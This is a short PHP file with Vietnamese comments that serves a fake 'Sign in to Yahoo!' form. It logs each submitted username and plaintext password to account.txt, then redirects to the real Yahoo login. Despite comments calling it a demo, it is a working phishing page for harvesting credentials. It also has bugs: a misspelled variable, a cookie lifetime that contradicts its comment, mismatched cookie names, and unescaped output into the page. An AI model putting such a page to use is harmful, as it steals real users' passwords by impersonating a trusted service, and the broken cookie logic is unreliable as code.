<?php
// Kiểm tra nếu người dùng đã từng chọn "Keep me signed in"
$saved_username = "";
if (!empty($_COOKIE['saved_user'])) {
    $saved_username = $_COOKIE['saved_user'];
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = $_POST['username'] ?? '';
    $password = $_POST['password'] ?? '';
    $keep     = isset($_POST['keep']);

    // Lưu ra file account.txt (demo)
    $log = "User: $username | Pass: $password | Time: " . date("Y-m-d H:i:s") . "\n";
    file_put_contents("account.txt", $log, FILE_APPEND);

    // Nếu user chọn "Keep me signed in" thì lưu cookie
    if ($keep) {
        setcookie("username", $username, time() + 20, "/"); // 30 ngày
        setcookie("password", $passwrod, time() + 20, "/");
    }

    // Sau khi ghi log xong thì giả lập submit đến Yahoo (chỉ minh họa)
    header('Location: https://login.yahoo.com/');
    exit;
}
?>

<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <title>Sign in Demo</title>
</head>
<body>
    <h2>Sign in to Yahoo!</h2>
    <form method="post">
        <label for="username">Yahoo! ID:</label><br>
        <input type="text" name="username" value="<?= ($saved_username) ?>"><br><br>

        <label for="password">Password:</label><br>
        <input type="password" name="password"><br><br>

        <input type="checkbox" name="keep" <?= !empty($saved_username) ? 'checked' : '' ?>>
        Keep me signed in<br><br>

        <button type="submit">Sign in</button>
    </form>
</body>
</html>
